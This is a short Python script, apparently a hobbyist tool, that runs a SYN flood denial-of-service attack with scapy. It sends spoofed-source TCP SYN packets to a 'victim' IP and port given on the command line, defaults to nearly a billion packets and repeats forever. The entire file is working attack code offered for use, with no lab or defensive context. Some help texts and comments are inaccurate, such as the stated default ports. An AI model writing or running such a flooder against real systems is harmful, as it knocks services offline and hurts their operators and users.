#!/usr/bin/env python3
import argparse
import random
from scapy.all import send, IP, TCP

# Default number of packets
DEFAULT_PACK = 999999999
# Total of Ports an OS can hold
MAX_PORTS = 65535
DEFAULT_PORT = 80

# Get generate random IP
def random_IP():
    # range(4) => 192.168.0.1 = 4 ranges
    # "." = joining 192.168.x.y
    IP = ".".join(map(str,(random.randint(0,255)for _ in range(4))))
    return IP

def get_args():
    parser = argparse.ArgumentParser(description="Sync Flooder\n")
    # Allow users to entert -flag arguments like Traditional Linux tools
    # python3 flooder.py 192.168.2.65 -a 999999999 -p 8082
    parser.add_argument('t', help="Victim's IP Addr")
    parser.add_argument('-a', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
    parser.add_argument('-p', type=int, help="Target Port (default ports are 8080/8081/8082)", default=80)
    args = parser.parse_args()
    # return -t -a -p
    return args.t, args.a, args.p

def syn_flood(Target_IP, dPort, packets_to_send):
    #print("Sending packets to the target...")
    # As we know how many packets to send, use for loop
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        # srcPort
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        # Calling back random IP returned from def random_IP()
        src_IP = random_IP()
        # Setting up packets
        # sport = Source Port
        # dport = Destination Port
        # seq = sequence ; seq_n = sequetial number
        packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
    #print("Sent all packets :D")
    #print(f'Sent all the packets {packet} from src_IP:sPort {src_IP}:{sPort} to Target_IP:dPort {Target_IP}:{dPort}')
        
def main():
    # Receiving all arguments Target_IP, dPort, packets_to_send from syn_flood()
    Target_IP, dPort, packets_to_send = get_args()    
    syn_flood(Target_IP, dPort, packets_to_send)

#main()

# Check if the script is being run as the main program
if __name__ == "__main__":
    while True:
        main()